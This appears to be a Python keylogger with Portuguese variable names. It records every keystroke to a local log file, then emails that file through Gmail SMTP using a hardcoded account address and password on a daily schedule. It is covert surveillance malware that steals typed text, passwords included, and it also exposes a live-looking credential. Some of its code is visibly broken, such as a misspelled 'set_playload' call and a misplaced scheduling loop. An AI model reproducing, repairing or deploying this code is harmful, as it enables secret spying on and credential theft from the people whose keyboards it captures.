from pynput.keyboard import Listener
import smtplib

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

from time import sleep
import schedule
import threading
import threading
import time

def captura():
    def capturar(tecla):
        traducao_teclas = {
            "Key.space" : " ",
            "Key.shift": "",
            "Key.enter": "\n",
        }

        dadosdaTecla = str(tecla)

        dadosdaTecla = dadosdaTecla.replace("'",    "")

        for chave_tecla in traducao_teclas:
            dadosdaTecla = dadosdaTecla.replace(chave_tecla, traducao_teclas[chave_tecla])

        with open('log.txt', 'a') as arquivo_log:
            arquivo_log.write(dadosdaTecla)

    with Listener(on_press=capturar) as escutar:
        escutar.join()


def envio():
    host = 'smtp.gmail.com'
    port = '587'
    login = 'audirsilveiro@gmail.com'
    senha = 'mtqetatfayqlnttx'
    
    server = smtplib.SMTP(host, port)

    server.ehlo()
    server.starttls()
    server.login(login, senha)

    corpo = 'Meus logs recebidos!'

    email_msg = MIMEMultipart()
    email_msg['From'] = login
    email_msg['To'] = login
    email_msg['Subject'] = 'Meu corpo de email enviado por key'
    email_msg.attach(MIMEText(corpo, 'plain'))

    cam_arquivo = 'log.txt'
    anexo = open(cam_arquivo, 'rb')

    att = MIMEBase('application', 'octet-stream')
    att.set_playload(anexo.read())
    encoders.encode_base64(att)

    att.add_header('Content-Disposition', f'attachment; filename = log.txt')
    email_msg.attach(att)

    server.sendmail(email_msg['From'], email_msg['To'], email_msg.as_string())
    server.quit()

    schedule.every().day.at("09:00").do(envio)

    while True:
        schedule.run_pending()
        sleep(1)

threading.Thread(target=captura).start()
threading.Thread(target=envio).start()